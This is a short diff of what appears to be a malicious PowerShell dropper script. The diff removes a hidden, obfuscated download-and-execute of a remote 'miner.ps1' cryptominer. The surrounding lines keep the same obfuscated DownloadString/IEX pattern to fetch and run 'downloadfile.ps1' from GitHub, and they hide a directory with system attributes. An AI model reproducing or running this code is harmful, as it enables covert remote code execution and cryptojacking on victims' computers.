@@ -96,9 +96,7 @@ attrib +h +s $dir
 
 
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/miner.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+
 
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/downloadfile.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
